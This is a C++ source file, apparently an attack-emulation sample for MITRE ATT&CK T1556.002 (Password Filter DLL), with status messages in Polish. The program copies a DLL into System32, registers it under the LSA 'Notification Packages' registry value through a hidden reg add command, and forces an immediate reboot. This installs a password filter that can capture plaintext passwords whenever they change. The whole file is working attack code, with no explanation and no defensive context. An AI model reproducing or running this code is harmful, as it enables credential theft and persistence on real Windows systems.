---
title: "T1556.002.Password Filter DLL"
folder: "07. Defense Evasion"
---


#include <windows.h>
#include <fstream>
#include <iostream>

bool Copy1File() {
    std::ifstream src("C:\\Users\\User\\Desktop\\passwordfilter.dll", std::ios::binary);
    std::ofstream dest("C:\\Windows\\System32\\passwordfilter.dll", std::ios::binary);

    if (!src.is_open() || !dest.is_open()) {
        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
        return false;
    }

    dest << src.rdbuf();

    if (src.fail() || dest.fail()) {
        std::cerr << "Błąd podczas kopiowania pliku.\n";
        return false;
    }

    std::cout << "Plik został pomyślnie skopiowany.\n";
    return true;
}
void AutorunRegistryBackground5() {

    const char* command = "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Notification Packages\" /t REG_MULTI_SZ /d \"scecli\\0passwordfilter\" /f"; STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
void AutorunRegistryBackground6() {

    const char* command = "shutdown /r /t 0";
    STARTUPINFOA si = {};
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;


    if (CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    Copy1File();
    AutorunRegistryBackground5();
    AutorunRegistryBackground6();
    return 0;
}